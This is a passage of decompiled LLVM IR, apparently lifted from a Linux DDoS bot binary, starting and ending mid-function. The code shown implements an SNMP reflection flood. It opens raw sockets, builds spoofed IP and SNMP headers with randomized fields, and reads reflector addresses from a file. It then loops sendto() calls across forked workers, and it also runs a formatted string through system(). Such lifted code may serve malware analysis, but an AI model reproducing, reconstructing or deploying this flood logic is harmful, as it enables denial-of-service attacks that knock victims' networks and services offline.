  %v2_804a5a6 = inttoptr i32 %v1_804a5a6 to i32*
  %v3_804a5a6 = load i32, i32* %v2_804a5a6, align 4
  %v3_804a5c3 = call i32 @socket(i32 2, i32 3, i32 6)
  %v5_804a5cb = icmp slt i32 %v3_804a5c3, 0
  %v1_804a5cf = icmp eq i1 %v5_804a5cb, false
  br i1 %v1_804a5cf, label %dec_label_pc_804a5dd, label %dec_label_pc_804a5d1

dec_label_pc_804a5d1:                             ; preds = %entry
  %v1_804a5d8 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804a5dd

dec_label_pc_804a5dd:                             ; preds = %entry, %dec_label_pc_804a5d1
  %v2_804a5e4 = call i32 @__GI_time(i32* null)
  %v1_804a5ec = call i32 @init_rand(i32 %v2_804a5e4)
  %v3_804a60d = bitcast i32* %stack_var_-4128 to i8*
  %v4_804a60d = call i32 @__GI_memset(i8* %v3_804a60d, i32 0, i32 4096)
  %v2_804a618 = call i32 @setup_ip_header(i8* %v3_804a60d)
  %v2_804a623 = call i32 @setup_snmp_header(i16* %v5_804a579)
  %v0_804a628 = call i32 @random()
  %v2_804a650 = sdiv i32 %v0_804a628, 13107
  store i32 %v2_804a650, i32* @ebx, align 4
  %tmp26 = mul i32 %v2_804a650, -65535
  %v2_804a669 = add i32 %tmp26, %v0_804a628
  %v1_804a678 = add i32 %v2_804a669, 64510
  %v1_804a683 = trunc i32 %v1_804a678 to i16
  %v2_804a683 = call i32 @htons(i16 %v1_804a683)
  %v1_804a68e = trunc i32 %v2_804a683 to i16
  store i16 %v1_804a68e, i16* %v5_804a579, align 4
  %v2_804a69a = add i32 %v2_804a56a, 12
  %v3_804a69a = inttoptr i32 %v2_804a69a to i32*
  store i32 %v3_804a588, i32* %v3_804a69a, align 4
  %v1_804a6a0 = add i32 %v3_804a5a6, 4
  %v2_804a6a0 = inttoptr i32 %v1_804a6a0 to i32*
  %v3_804a6a0 = load i32, i32* %v2_804a6a0, align 4
  %v2_804a6a6 = add i32 %v2_804a56a, 16
  %v3_804a6a6 = inttoptr i32 %v2_804a6a6 to i32*
  store i32 %v3_804a6a0, i32* %v3_804a6a6, align 4
  %v1_804a6ac = or i32 %v2_804a56a, 2
  %v2_804a6ac = inttoptr i32 %v1_804a6ac to i16*
  %v3_804a6ac = load i16, i16* %v2_804a6ac, align 2
  %div = udiv i16 %v3_804a6ac, 2
  %v2_804a6b0 = zext i16 %div to i32
  %v2_804a6c2 = bitcast i32* %stack_var_-4128 to i16*
  %v3_804a6c2 = call i32 @csum(i16* %v2_804a6c2, i32 %v2_804a6b0)
  %v1_804a6cd = trunc i32 %v3_804a6c2 to i16
  %v3_804a6cd = add i32 %v2_804a56a, 10
  %v4_804a6cd = inttoptr i32 %v3_804a6cd to i16*
  store i16 %v1_804a6cd, i16* %v4_804a6cd, align 2
  store i32 1, i32* %stack_var_-4148, align 4
  %v2_804a6db = ptrtoint i32* %stack_var_-4148 to i32
  %v5_804a709 = call i32 @__GI_setsockopt(i32 %v3_804a5c3, i32 0, i32 3, i32 %v2_804a6db, i32 4)
  %v2_804a70e = icmp slt i32 %v5_804a709, 0
  %v1_804a710 = icmp eq i1 %v2_804a70e, false
  br i1 %v1_804a710, label %dec_label_pc_804a71e, label %dec_label_pc_804a712

dec_label_pc_804a712:                             ; preds = %dec_label_pc_804a5dd
  %v1_804a719 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804a71e

dec_label_pc_804a71e:                             ; preds = %dec_label_pc_804a5dd, %dec_label_pc_804a712
  %v2_804a725 = call i32 @__GI_time(i32* null)
  %v1_804a72d = call i32 @init_rand(i32 %v2_804a725)
  %v3_804a7a0 = add i32 %v2_804a56a, 4
  %v4_804a7a0 = inttoptr i32 %v3_804a7a0 to i16*
  br label %dec_label_pc_804a73c

dec_label_pc_804a73c:                             ; preds = %dec_label_pc_804a7fb, %dec_label_pc_804a71e
  %stack_var_-20.0 = phi i32 [ %v3_804a5a6, %dec_label_pc_804a71e ], [ %v3_804a778, %dec_label_pc_804a7fb ]
  %storemerge = phi i32 [ 0, %dec_label_pc_804a71e ], [ %v4_804a7fb, %dec_label_pc_804a7fb ]
  %v3_804a744 = load i16, i16* %v2_804a6ac, align 2
  %v4_804a744 = zext i16 %v3_804a744 to i32
  %v6_804a770 = call i32 @sendto(i32 %v3_804a5c3, i32 %v2_804a56a, i32 %v4_804a744, i32 0, i32 %stack_var_-20.0, i32 16)
  %v1_804a778 = add i32 %stack_var_-20.0, 532
  %v2_804a778 = inttoptr i32 %v1_804a778 to i32*
  %v3_804a778 = load i32, i32* %v2_804a778, align 4
  %v1_804a784 = add i32 %v3_804a778, 4
  %v2_804a784 = inttoptr i32 %v1_804a784 to i32*
  %v3_804a784 = load i32, i32* %v2_804a784, align 4
  store i32 %v3_804a784, i32* %v3_804a6a6, align 4
  %v1_804a78d = call i32 @rand_cmwc(i32 %v3_804a778)
  %v1_804a795 = call i32 @htonl(i32 %v1_804a78d)
  %v1_804a7a0 = trunc i32 %v1_804a795 to i16
  store i16 %v1_804a7a0, i16* %v4_804a7a0, align 4
  %v3_804a7a7 = load i16, i16* %v2_804a6ac, align 2
  %div27 = udiv i16 %v3_804a7a7, 2
  %v2_804a7ab = zext i16 %div27 to i32
  %v3_804a7bd = call i32 @csum(i16* %v2_804a6c2, i32 %v2_804a7ab)
  %v1_804a7c8 = trunc i32 %v3_804a7bd to i16
  store i16 %v1_804a7c8, i16* %v4_804a6cd, align 2
  %v0_804a7cc = load i64, i64* @global_var_807e2e0.88, align 8
  %v1_804a7cc = trunc i64 %v0_804a7cc to i32
  %v1_804a7d1 = add i32 %v1_804a7cc, 1
  %v1_804a7d2 = sext i32 %v1_804a7d1 to i64
  store i64 %v1_804a7d2, i64* @global_var_807e2e0.88, align 32
  %v0_804a7d7 = load i32, i32* @global_var_807e1a8.89, align 8
  %v6_804a7e2 = icmp ugt i32 %v0_804a7d7, %storemerge
  br i1 %v6_804a7e2, label %dec_label_pc_804a7fb, label %dec_label_pc_804a7e4

dec_label_pc_804a7e4:                             ; preds = %dec_label_pc_804a73c
  %v0_804a7ee = load i32, i32* @global_var_8070d88.90, align 8
  %v1_804a7f6 = sext i32 %v0_804a7ee to i64
  %v2_804a7f6 = call i32 @usleep(i64 %v1_804a7f6)
  br label %dec_label_pc_804a7fb

dec_label_pc_804a7fb:                             ; preds = %dec_label_pc_804a73c, %dec_label_pc_804a7e4
  %stack_var_-4156.0 = phi i32 [ %storemerge, %dec_label_pc_804a73c ], [ 0, %dec_label_pc_804a7e4 ]
  %v4_804a7fb = add i32 %stack_var_-4156.0, 1
  br label %dec_label_pc_804a73c

; uselistorder directives
  uselistorder i32 %v3_804a778, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %v2_804a650, { 1, 0 }
  uselistorder i32 %v0_804a628, { 1, 0 }
  uselistorder i32 %v2_804a56a, { 5, 1, 2, 0, 3, 4, 6 }
  uselistorder i32* %stack_var_-4148, { 1, 0 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder label %dec_label_pc_804a7fb, { 1, 0 }
  uselistorder label %dec_label_pc_804a71e, { 1, 0 }
  uselistorder label %dec_label_pc_804a5dd, { 1, 0 }
}

define i32 @snmp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-1088 = alloca i32, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804a820 = call i32 @mfork(i32 %arg2)
  store i32 %v2_804a820, i32* %eax.global-to-local, align 4
  %v1_804a825 = icmp eq i32 %v2_804a820, 0
  %v1_804a827 = icmp eq i1 %v1_804a825, false
  br i1 %v1_804a827, label %dec_label_pc_804ad6d, label %dec_label_pc_804a82d

dec_label_pc_804a82d:                             ; preds = %entry
  %v5_804a844 = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v5_804a844, i32* %eax.global-to-local, align 4
  %v5_804a84c = icmp slt i32 %v5_804a844, 0
  %v1_804a850 = icmp eq i1 %v5_804a84c, false
  br i1 %v1_804a850, label %dec_label_pc_804a85e, label %dec_label_pc_804a852

dec_label_pc_804a852:                             ; preds = %dec_label_pc_804a82d
  %v2_804a859 = call i32 @__GI_exit(i32 1)
  store i32 %v2_804a859, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a85e

dec_label_pc_804a85e:                             ; preds = %dec_label_pc_804a82d, %dec_label_pc_804a852
  %v4_804a85e = add i32 %arg3, -5
  %v9_804a85e = sub i32 4, %arg3
  %v10_804a85e = and i32 %v9_804a85e, %arg3
  %v11_804a85e = icmp slt i32 %v10_804a85e, 0
  %v12_804a85e = icmp eq i32 %v4_804a85e, 0
  %v13_804a85e = icmp slt i32 %v4_804a85e, 0
  %v3_804a862 = icmp eq i1 %v13_804a85e, %v11_804a85e
  %v4_804a862 = icmp eq i1 %v12_804a85e, false
  %v5_804a862 = and i1 %v4_804a862, %v3_804a862
  br i1 %v5_804a862, label %dec_label_pc_804a88a, label %dec_label_pc_804a864

dec_label_pc_804a864:                             ; preds = %dec_label_pc_804a85e
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v3_804a879 = call i32 @Send(i32 %arg1, i32 ptrtoint ([99 x i8]* @global_var_8069d08.91 to i32))
  store i32 %v3_804a879, i32* %eax.global-to-local, align 4
  %v2_804a885 = call i32 @__GI_exit(i32 -1)
  store i32 %v2_804a885, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a88a

dec_label_pc_804a88a:                             ; preds = %dec_label_pc_804a85e, %dec_label_pc_804a864
  %v1_804a88d = add i32 %arg4, 12
  store i32 %v1_804a88d, i32* %eax.global-to-local, align 4
  %v1_804a890 = inttoptr i32 %v1_804a88d to i32*
  %v2_804a890 = load i32, i32* %v1_804a890, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_804a89d = and i32 %v2_804a890, -256
  store i32 %v1_804a89d, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804a8a0 = inttoptr i32 %v2_804a890 to i8*
  %v3_804a8a6 = call i32 @_strlen(i8* %v4_804a8a0)
  %v4_804a8a6 = mul i32 %v3_804a8a6, -1
  %v5_804a8a6 = add i32 %v4_804a8a6, -2
  store i32 %v5_804a8a6, i32* %ecx.global-to-local, align 4
  %v1_804a8ac = sub i32 0, %v4_804a8a6
  store i32 %v1_804a8ac, i32* %edx.global-to-local, align 4
  %v2_804a8b4 = mul i32 %v3_804a8a6, 5
  %v1_804a8b6 = add i32 %v2_804a8b4, 165
  store i32 %v1_804a8b6, i32* %eax.global-to-local, align 4
  %v4_804a8be = add i32 %v2_804a8b4, -858
  %v9_804a8be = sub i32 857, %v2_804a8b4
  %v10_804a8be = and i32 %v9_804a8be, %v1_804a8b6
  %v11_804a8be = icmp slt i32 %v10_804a8be, 0
  %v12_804a8be = icmp eq i32 %v4_804a8be, 0
  %v13_804a8be = icmp slt i32 %v4_804a8be, 0
  %v3_804a8c5 = icmp eq i1 %v13_804a8be, %v11_804a8be
  %v4_804a8c5 = icmp eq i1 %v12_804a8be, false
  %v5_804a8c5 = and i1 %v4_804a8c5, %v3_804a8c5
  br i1 %v5_804a8c5, label %dec_label_pc_804ad6d, label %dec_label_pc_804a8cb

dec_label_pc_804a8cb:                             ; preds = %dec_label_pc_804a88a
  store i32 %v1_804a88d, i32* %eax.global-to-local, align 4
  %v2_804a8d1 = load i32, i32* %v1_804a890, align 4
  store i32 %v2_804a8d1, i32* %edx.global-to-local, align 4
  store i32 %v1_804a88d, i32* %eax.global-to-local, align 4
  %v2_804a8d9 = load i32, i32* %v1_804a890, align 4
  store i32 %v2_804a8d9, i32* %ecx.global-to-local, align 4
  store i32 %v1_804a88d, i32* %eax.global-to-local, align 4
  %v2_804a8e1 = load i32, i32* %v1_804a890, align 4
  store i32 %v2_804a8e1, i32* @ebx, align 4
  store i32 %v1_804a88d, i32* %eax.global-to-local, align 4
  %v2_804a8e9 = load i32, i32* %v1_804a890, align 4
  store i32 %v2_804a8e9, i32* @esi, align 4
  store i32 %v1_804a88d, i32* %eax.global-to-local, align 4
  %v2_804a8f1 = load i32, i32* %v1_804a890, align 4
  store i32 %v1_804a8b6, i32* @edi, align 4
  %v2_804a916 = ptrtoint i32* %stack_var_-1088 to i32
  store i32 %v2_804a916, i32* %eax.global-to-local, align 4
  %v9_804a91f = call i32 @__GI_snprintf(i32 %v2_804a916, i32 %v1_804a8b6, i32 ptrtoint ([176 x i8]* @global_var_8069d6c.92 to i32), i32 %v2_804a8f1, i32 %v2_804a8e9, i32 %v2_804a8e1, i32 %v2_804a8d9)
  store i32 %v2_804a916, i32* %eax.global-to-local, align 4
  %v2_804a92d = call i32 @system(i32 %v2_804a916)
  store i32 %v2_804a92d, i32* %eax.global-to-local, align 4
  %v3_804a939 = call i32 @__GI_time(i32* null)
  store i32 %v3_804a939, i32* %eax.global-to-local, align 4
  %v2_804a941 = call i32 @srand(i32 %v3_804a939)
  store i32 0, i32* @global_var_807f300.80, align 256
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_804a964 = call i32 @malloc(i32 128)
  store i32 %v2_804a964, i32* %edx.global-to-local, align 4
  %v1_804a972 = inttoptr i32 %v2_804a964 to i8*
  store i32 %v2_804a964, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  store i32 128, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804a979 = call i8* @_memset(i8* %v1_804a972, i32 0, i32 128)
  %v6_804a979 = ptrtoint i8* %v5_804a979 to i32
  store i32 %v6_804a979, i32* %ecx.global-to-local, align 4
  %v0_804a97b = load i32, i32* %edx.global-to-local, align 4
  %v1_804a983 = add i32 %arg4, 16
  store i32 %v1_804a983, i32* %eax.global-to-local, align 4
  %v1_804a986 = inttoptr i32 %v1_804a983 to i32*
  %v2_804a986 = load i32, i32* %v1_804a986, align 4
  store i32 %v2_804a986, i32* %eax.global-to-local, align 4
  %v2_804a98b = call i32 @atol(i32 %v2_804a986)
  %v1_804a996 = add i32 %arg4, 20
  store i32 %v1_804a996, i32* %eax.global-to-local, align 4
  %v1_804a999 = inttoptr i32 %v1_804a996 to i32*
  %v2_804a999 = load i32, i32* %v1_804a999, align 4
  store i32 %v2_804a999, i32* %eax.global-to-local, align 4
  %v2_804a99e = call i32 @atol(i32 %v2_804a999)
  store i32 %v2_804a99e, i32* @eax, align 4
  store i32 0, i32* @global_var_807e1a8.89, align 8
  store i64 0, i64* @global_var_807e2e0.88, align 32
  %v3_804a9d0 = call i32 @__GI_fopen(i32 ptrtoint ([9 x i8]* @global_var_8069e1c.93 to i32), i32 ptrtoint ([2 x i8]* @global_var_8069c83.83 to i32))
  store i32 %v3_804a9d0, i32* %eax.global-to-local, align 4
  %v4_804ab50 = inttoptr i32 %v0_804a97b to i8*
  %v1_804a9eb = and i32 %v0_804a97b, -256
  %v5_804aa51 = add i32 %v0_804a97b, -1
  br label %dec_label_pc_804ab3f.outer

dec_label_pc_804a9dd:                             ; preds = %dec_label_pc_804ab3f
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804a9eb, i32* %eax.global-to-local, align 4
  %v3_804a9f4 = call i32 @_strlen(i8* %v4_804ab50)
  %v4_804a9f4 = mul i32 %v3_804a9f4, -1
  %v5_804a9f4 = add i32 %v4_804a9f4, -2
  store i32 %v5_804a9f4, i32* %ecx.global-to-local, align 4
  %v5_804a9fb = sub i32 %v0_804a97b, %v4_804a9f4
  %v1_804a9fe = add i32 %v5_804a9fb, -1
  store i32 %v1_804a9fe, i32* %eax.global-to-local, align 4
  %v1_804a9ff = inttoptr i32 %v1_804a9fe to i8*
  %v2_804a9ff = load i8, i8* %v1_804a9ff, align 1
  %v3_804a9ff = zext i8 %v2_804a9ff to i32
  store i32 %v3_804a9ff, i32* %eax.global-to-local, align 4
  %v10_804aa02 = icmp eq i8 %v2_804a9ff, 10
  br i1 %v10_804aa02, label %dec_label_pc_804aa33, label %dec_label_pc_804aa06

dec_label_pc_804aa06:                             ; preds = %dec_label_pc_804a9dd
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804a9eb, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_804a97b, i32* @edi, align 4
  %v3_804aa1d = call i32 @_strlen(i8* %v4_804ab50)
  %v4_804aa1d = mul i32 %v3_804aa1d, -1
  %v5_804aa1d = add i32 %v4_804aa1d, -2
  store i32 %v5_804aa1d, i32* @ecx, align 4
  %v5_804aa24 = sub i32 %v0_804a97b, %v4_804aa1d
  %v1_804aa27 = add i32 %v5_804aa24, -1
  store i32 %v1_804aa27, i32* %eax.global-to-local, align 4
  %v1_804aa28 = inttoptr i32 %v1_804aa27 to i8*
  %v2_804aa28 = load i8, i8* %v1_804aa28, align 1
  %v3_804aa28 = zext i8 %v2_804aa28 to i32
  store i32 %v3_804aa28, i32* %eax.global-to-local, align 4
  %v10_804aa2b = icmp eq i8 %v2_804aa28, 13
  %v1_804aa2d = icmp eq i1 %v10_804aa2b, false
  br i1 %v1_804aa2d, label %dec_label_pc_804ab3f, label %dec_label_pc_804aa33

dec_label_pc_804aa33:                             ; preds = %dec_label_pc_804aa06, %dec_label_pc_804a9dd
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804a9eb, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_804a97b, i32* @edi, align 4
  %v3_804aa4a = call i32 @_strlen(i8* %v4_804ab50)
  %v4_804aa4a = mul i32 %v3_804aa4a, -1
  %v5_804aa4a = add i32 %v4_804aa4a, -2
  store i32 %v5_804aa4a, i32* @ecx, align 4
  %v1_804aa54 = sub i32 %v5_804aa51, %v4_804aa4a
  %v1_804aa55 = inttoptr i32 %v1_804aa54 to i8*
  store i8 0, i8* %v1_804aa55, align 1
  %v0_804aa58 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804aa58, i32* %eax.global-to-local, align 4
  %v1_804aa5d = icmp eq i32 %v0_804aa58, 0
  %v1_804aa5f = icmp eq i1 %v1_804aa5d, false
  %v2_804aad1 = call i32 @malloc(i32 540)
  store i32 %v2_804aad1, i32* %eax.global-to-local, align 4
  br i1 %v1_804aa5f, label %dec_label_pc_804aaca, label %dec_label_pc_804aa61

dec_label_pc_804aa61:                             ; preds = %dec_label_pc_804aa33
  store i32 %v2_804aad1, i32* @global_var_807f300.80, align 256
  store i32 %v2_804aad1, i32* %eax.global-to-local, align 4
  %v1_804aa77 = inttoptr i32 %v2_804aad1 to i32*
  store i32 0, i32* %v1_804aa77, align 4
  %v0_804aa7d = load i32, i32* %eax.global-to-local, align 4
  %v1_804aa7d = add i32 %v0_804aa7d, 4
  %v2_804aa7d = inttoptr i32 %v1_804aa7d to i32*
  store i32 0, i32* %v2_804aa7d, align 4
  %v0_804aa84 = load i32, i32* %eax.global-to-local, align 4
  %v1_804aa84 = add i32 %v0_804aa84, 8
  %v2_804aa84 = inttoptr i32 %v1_804aa84 to i32*
  store i32 0, i32* %v2_804aa84, align 4
  %v0_804aa8b = load i32, i32* %eax.global-to-local, align 4
  %v1_804aa8b = add i32 %v0_804aa8b, 12
  %v2_804aa8b = inttoptr i32 %v1_804aa8b to i32*
  store i32 0, i32* %v2_804aa8b, align 4
  %v0_804aa92 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804aa92, i32* @ebx, align 4
  store i32 %v0_804a97b, i32* %eax.global-to-local, align 4
  %v2_804aa9e = call i32 @inet_addr(i32 %v0_804a97b)
  %v1_804aaa3 = load i32, i32* @ebx, align 4
  %v2_804aaa3 = add i32 %v1_804aaa3, 4
  %v3_804aaa3 = inttoptr i32 %v2_804aaa3 to i32*
  store i32 %v2_804aa9e, i32* %v3_804aaa3, align 4
  %v0_804aaa6 = load i32, i32* @global_var_807f300.80, align 256
  %v2_804aab1 = add i32 %v0_804aaa6, 532
  %v3_804aab1 = inttoptr i32 %v2_804aab1 to i32*
  store i32 %v0_804aaa6, i32* %v3_804aab1, align 4
  %v0_804aab7 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804aab7, i32* @edx, align 4
  store i32 %v0_804aab7, i32* %eax.global-to-local, align 4
  %v2_804aac2 = add i32 %v0_804aab7, 536
  %v3_804aac2 = inttoptr i32 %v2_804aac2 to i32*
  store i32 %v0_804aab7, i32* %v3_804aac2, align 4
  br label %dec_label_pc_804ab3c

dec_label_pc_804aaca:                             ; preds = %dec_label_pc_804aa33
  store i32 %v2_804aad1, i32* @edx, align 4
  store i32 540, i32* %eax.global-to-local, align 4
  %v4_804aaef = inttoptr i32 %v2_804aad1 to i8*
  %v6_804aaf2 = call i32 @__GI_memset(i8* %v4_804aaef, i32 0, i32 540)
  store i32 %v0_804a97b, i32* %eax.global-to-local, align 4
  %v2_804aafd = call i32 @inet_addr(i32 %v0_804a97b)
  %v2_804ab07 = add i32 %v2_804aad1, 4
  %v3_804ab07 = inttoptr i32 %v2_804ab07 to i32*
  store i32 %v2_804aafd, i32* %v3_804ab07, align 4
  %v0_804ab0a = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804ab0a, i32* %edx.global-to-local, align 4
  %v2_804ab13 = add i32 %v2_804aad1, 536
  %v3_804ab13 = inttoptr i32 %v2_804ab13 to i32*
  store i32 %v0_804ab0a, i32* %v3_804ab13, align 4
  %v0_804ab19 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804ab19, i32* %eax.global-to-local, align 4
  %v1_804ab1e = add i32 %v0_804ab19, 532
  %v2_804ab1e = inttoptr i32 %v1_804ab1e to i32*
  %v3_804ab1e = load i32, i32* %v2_804ab1e, align 4
  %v2_804ab27 = add i32 %v2_804aad1, 532
  %v3_804ab27 = inttoptr i32 %v2_804ab27 to i32*
  store i32 %v3_804ab1e, i32* %v3_804ab27, align 4
  %v0_804ab2d = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804ab2d, i32* @edx, align 4
  store i32 %v2_804aad1, i32* %eax.global-to-local, align 4
  %v2_804ab36 = add i32 %v0_804ab2d, 532
  %v3_804ab36 = inttoptr i32 %v2_804ab36 to i32*
  store i32 %v2_804aad1, i32* %v3_804ab36, align 4
  br label %dec_label_pc_804ab3c

dec_label_pc_804ab3c:                             ; preds = %dec_label_pc_804aa61, %dec_label_pc_804aaca
  br label %dec_label_pc_804ab3f.outer

dec_label_pc_804ab3f.outer:                       ; preds = %dec_label_pc_804ab3c, %dec_label_pc_804a8cb
  br label %dec_label_pc_804ab3f

dec_label_pc_804ab3f:                             ; preds = %dec_label_pc_804ab3f.outer, %dec_label_pc_804aa06
  store i32 %v0_804a97b, i32* %eax.global-to-local, align 4
  %v5_804ab53 = call i32 @fgets(i32 %v0_804a97b, i32 128, i32 %v3_804a9d0)
  store i32 %v5_804ab53, i32* %eax.global-to-local, align 4
  %v1_804ab58 = icmp eq i32 %v5_804ab53, 0
  %v1_804ab5a = icmp eq i1 %v1_804ab58, false
  br i1 %v1_804ab5a, label %dec_label_pc_804a9dd, label %dec_label_pc_804ab60

dec_label_pc_804ab60:                             ; preds = %dec_label_pc_804ab3f
  %v0_804ab60 = load i32, i32* @global_var_807f300.80, align 256
  store i32 %v0_804ab60, i32* %eax.global-to-local, align 4
  %v1_804ab65 = add i32 %v0_804ab60, 532
  %v2_804ab65 = inttoptr i32 %v1_804ab65 to i32*
  %v3_804ab65 = load i32, i32* %v2_804ab65, align 4
  %v1_804ab7a = add i32 %arg4, 4
  store i32 %v1_804ab7a, i32* %eax.global-to-local, align 4
  %v1_804ab7d = inttoptr i32 %v1_804ab7a to i32*
  %v2_804ab7d = load i32, i32* %v1_804ab7d, align 4
  store i32 %v2_804ab7d, i32* %eax.global-to-local, align 4
  %v2_804ab82 = call i32 @inet_addr(i32 %v2_804ab7d)
  %v1_804ab90 = mul i32 %v2_804a98b, 4
  store i32 %v1_804ab90, i32* %edx.global-to-local, align 4
  %v2_804ab9e = mul i32 %v2_804a98b, 28
  %v1_804aba3 = add i32 %v2_804ab9e, 30
  %v2_804aba6 = and i32 %v1_804aba3, -16
  %v0_804abac = load i32, i32* @esp, align 4
  %v2_804abac = sub i32 %v0_804abac, %v2_804aba6
  %v1_804abbe = add i32 %v2_804abac, 47
  %v2_804abc1 = and i32 %v1_804abbe, -16
  store i32 %v2_804abc1, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804ac8255 = icmp sgt i32 %v2_804a98b, 0
  br i1 %v5_804ac8255, label %dec_label_pc_804abe2.lr.ph, label %dec_label_pc_804ac88

dec_label_pc_804abe2.lr.ph:                       ; preds = %dec_label_pc_804ab60
  %v3_804ac16 = or i32 %v2_804abc1, 8
  br label %dec_label_pc_804abe2

dec_label_pc_804abe2:                             ; preds = %dec_label_pc_804abe2, %dec_label_pc_804abe2.lr.ph
  %storemerge456 = phi i32 [ 0, %dec_label_pc_804abe2.lr.ph ], [ %v4_804ac79, %dec_label_pc_804abe2 ]
  %v1_804abe8 = mul i32 %storemerge456, 4
  %v2_804abf6 = mul i32 %storemerge456, 28
  %v3_804abfb = add i32 %v2_804abf6, %v2_804abc1
  %v4_804abfb = inttoptr i32 %v3_804abfb to i32*
  store i32 %storemerge456, i32* %v4_804abfb, align 4
  store i32 %v2_804abc1, i32* %ecx.global-to-local, align 4
  store i32 %v2_804abf6, i32* %edx.global-to-local, align 4
  %v4_804ac16 = add i32 %v3_804ac16, %v2_804abf6
  %v5_804ac16 = inttoptr i32 %v4_804ac16 to i32*
  store i32 2, i32* %v5_804ac16, align 4
  %v1_804ac20 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ac20 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804ac20 = add i32 %v1_804ac20, 12
  %v4_804ac20 = add i32 %v3_804ac20, %v2_804ac20
  %v5_804ac20 = inttoptr i32 %v4_804ac20 to i32*
  store i32 %v2_804ab82, i32* %v5_804ac20, align 4
  %v1_804ac2a = load i32, i32* %edx.global-to-local, align 4
  %v2_804ac2a = load i32, i32* %ecx.global-to-local, align 4
  %v3_804ac2a = add i32 %v1_804ac2a, 16
  %v4_804ac2a = add i32 %v3_804ac2a, %v2_804ac2a
  %v5_804ac2a = inttoptr i32 %v4_804ac2a to i32*
  %v1_804ac34 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ac34 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804ac34 = add i32 %v1_804ac34, 20
  %v4_804ac34 = add i32 %v3_804ac34, %v2_804ac34
  %v5_804ac34 = inttoptr i32 %v4_804ac34 to i32*
  %v1_804ac50 = add i32 %v3_804abfb, 4
  %v2_804ac56 = inttoptr i32 %v1_804ac50 to i32*
  store i32 %v3_804ab65, i32* %v2_804ac56, align 4
  store i32 %v2_804abc1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804abe8, i32* %edx.global-to-local, align 4
  store i32 %v3_804abfb, i32* %eax.global-to-local, align 4
  %v1_804ac71 = load i32, i32* @esp, align 4
  %v2_804ac71 = inttoptr i32 %v1_804ac71 to i32*
  store i32 %v3_804abfb, i32* %v2_804ac71, align 4
  %v0_804ac74 = call i32 @snmpflood()
  %v4_804ac79 = add nuw nsw i32 %storemerge456, 1
  store i32 %v4_804ac79, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804ac79, %v2_804a98b
  br i1 %exitcond, label %dec_label_pc_804ac7c.dec_label_pc_804ac88_crit_edge, label %dec_label_pc_804abe2

dec_label_pc_804ac7c.dec_label_pc_804ac88_crit_edge: ; preds = %dec_label_pc_804abe2
  %v1_804ac98.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ac88

dec_label_pc_804ac88:                             ; preds = %dec_label_pc_804ac7c.dec_label_pc_804ac88_crit_edge, %dec_label_pc_804ab60
  %v1_804ac98 = phi i32 [ %v1_804ac98.pre, %dec_label_pc_804ac7c.dec_label_pc_804ac88_crit_edge ], [ %v2_804abac, %dec_label_pc_804ab60 ]
  %storemerge4.lcssa = phi i32 [ %v2_804a98b, %dec_label_pc_804ac7c.dec_label_pc_804ac88_crit_edge ], [ 0, %dec_label_pc_804ab60 ]
  %v1_804ac8b = add i32 %arg4, 8
  store i32 %v1_804ac8b, i32* %eax.global-to-local, align 4
  %v1_804ac8e = inttoptr i32 %v1_804ac8b to i32*
  %v2_804ac8e = load i32, i32* %v1_804ac8e, align 4
  store i32 %v2_804ac8e, i32* %edx.global-to-local, align 4
  store i32 %v1_804ab7a, i32* %eax.global-to-local, align 4
  %v2_804ac96 = load i32, i32* %v1_804ab7d, align 4
  store i32 %v2_804ac96, i32* %eax.global-to-local, align 4
  %v2_804ac98 = add i32 %v1_804ac98, 16
  %v3_804ac98 = inttoptr i32 %v2_804ac98 to i32*
  store i32 %v2_804ac8e, i32* %v3_804ac98, align 4
  %v0_804ac9c = load i32, i32* %eax.global-to-local, align 4
  %v1_804ac9c = load i32, i32* @esp, align 4
  %v2_804ac9c = add i32 %v1_804ac9c, 12
  %v3_804ac9c = inttoptr i32 %v2_804ac9c to i32*
  store i32 %v0_804ac9c, i32* %v3_804ac9c, align 4
  %v1_804aca3 = load i32, i32* @esp, align 4
  %v2_804aca3 = add i32 %v1_804aca3, 8
  %v3_804aca3 = inttoptr i32 %v2_804aca3 to i32*
  store i32 %arg2, i32* %v3_804aca3, align 4
  %v0_804aca7 = load i32, i32* @esp, align 4
  %v1_804aca7 = add i32 %v0_804aca7, 4
  %v2_804aca7 = inttoptr i32 %v1_804aca7 to i32*
